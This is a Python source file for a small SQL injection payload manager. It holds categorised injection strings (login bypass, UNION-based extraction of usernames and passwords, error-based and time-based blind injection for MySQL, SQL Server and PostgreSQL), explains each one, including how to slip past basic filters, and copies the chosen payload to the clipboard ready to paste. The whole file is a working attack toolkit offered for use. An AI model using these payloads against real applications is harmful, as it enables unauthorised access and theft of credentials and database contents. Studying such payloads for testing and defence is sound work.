from dataclasses import dataclass
import pyperclip

@dataclass
class SQLInjection:
    name: str
    example: str
    description: str

class InjectionManager:
    def __init__(self):
        # Initialize with some predefined categories and their injections
        self.categories = {
            'Authentication Bypass': [
                {
                    'payload': "' OR '1'='1",
                    'explanation': "This injection creates a condition that's always true by making '1'='1'. "
                                 "It bypasses login by making the WHERE clause always evaluate to true."
                },
                {
                    'payload': "' OR '1'='1' --",
                    'explanation': "Similar to the first one, but uses '--' to comment out the rest of the query. "
                                 "The double dash prevents any remaining SQL code from executing."
                },
                {
                    'payload': "' OR 1=1 #",
                    'explanation': "Uses '#' for MySQL comment syntax instead of '--'. "
                                 "Works the same way by commenting out remaining conditions."
                },
                {
                    'payload': "admin' --",
                    'explanation': "Injects the username 'admin' and comments out the password check. "
                                 "Useful when you know a valid username."
                },
                {
                    'payload': "admin' #",
                    'explanation': "Same as above but uses MySQL comment syntax. "
                                 "Attempts to log in as 'admin' while bypassing password verification."
                },
                {
                    'payload': "' OR 'x'='x",
                    'explanation': "Another always-true condition using string comparison. "
                                 "Less likely to be caught by basic filters that look for '1'='1'."
                }
            ],
            'Union Based': [
                {
                    'payload': "' UNION SELECT NULL--",
                    'explanation': "Tests for a single column UNION injection. "
                                 "NULL is used to match any data type in the original query."
                },
                {
                    'payload': "' UNION SELECT NULL,NULL--",
                    'explanation': "Tests for two columns. Each NULL represents a column. "
                                 "Used to determine the number of columns in the original query."
                },
                {
                    'payload': "' UNION SELECT username,password FROM users--",
                    'explanation': "Attempts to extract username and password from the users table. "
                                 "Requires knowing the table and column names."
                },
                {
                    'payload': "' UNION ALL SELECT NULL--",
                    'explanation': "Similar to UNION SELECT but includes duplicate rows. "
                                 "UNION ALL is sometimes faster as it skips the duplicate removal process."
                },
                {
                    'payload': "' UNION ALL SELECT NULL,NULL--",
                    'explanation': "Two-column UNION ALL injection. "
                                 "Used when you need all rows including duplicates."
                }
            ],
            'Error Based': [
                {
                    'payload': "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a) --",
                    'explanation': "Exploits GROUP BY clause to cause a duplicate key error that reveals database version. "
                                 "Works in MySQL by forcing an error message that contains useful information."
                },
                {
                    'payload': "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT DATABASE()),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a) --",
                    'explanation': "Similar to the first one but extracts the current database name. "
                                 "Uses concatenation with a counter to force a grouping error."
                },
                {
                    'payload': "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version),0x7e)) --",
                    'explanation': "Uses XML function EXTRACTVALUE to force an error containing database version. "
                                 "The error message will include the extracted information between the ~ characters."
                },
                {
                    'payload': "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT table_name FROM information_schema.tables LIMIT 1),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a) --",
                    'explanation': "Forces an error that reveals the first table name in the database. "
                                 "Useful for database enumeration when error messages are visible."
                }
            ],
            'Time Based': [
                {
                    'payload': "' AND (SELECT * FROM (SELECT(SLEEP(5)))a) --",
                    'explanation': "Causes the database to sleep for 5 seconds if the injection is successful. "
                                 "Useful for blind SQL injection when no output is visible."
                },
                {
                    'payload': "' AND IF(1=1,SLEEP(5),0) --",
                    'explanation': "Conditional time delay - sleeps only if the condition is true. "
                                 "Can be used to test for specific conditions in blind injection scenarios."
                },
                {
                    'payload': "'; WAITFOR DELAY '0:0:5' --",
                    'explanation': "SQL Server specific time delay injection. "
                                 "Causes a 5-second delay if successfully executed."
                },
                {
                    'payload': "' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END) --",
                    'explanation': "PostgreSQL specific time-based injection using CASE statement. "
                                 "Allows for conditional delays based on boolean expressions."
                },
                {
                    'payload': "' UNION SELECT SLEEP(5) --",
                    'explanation': "Combines UNION attack with time delay. "
                                 "Useful when trying to confirm UNION injection possibilities."
                }
            ]
        }

    def list_categories(self):
        print("\nAvailable Categories:")
        for category in self.categories:
            print(f"- {category}")

    def list_injections(self, category):
        if category in self.categories:
            print(f"\nInjections for {category}:")
            for i, injection in enumerate(self.categories[category], 1):
                print(f"{i}. {injection['payload']}")
            return True
        return False

    def get_injection(self, category, index, explain=False):
        if category in self.categories:
            injections = self.categories[category]
            if 1 <= index <= len(injections):
                injection = injections[index - 1]
                pyperclip.copy(injection['payload'])
                print(f"\nCopied to clipboard: {injection['payload']}")
                if explain:
                    print("\nExplanation:")
                    print(injection['explanation'])
                return True
        return False
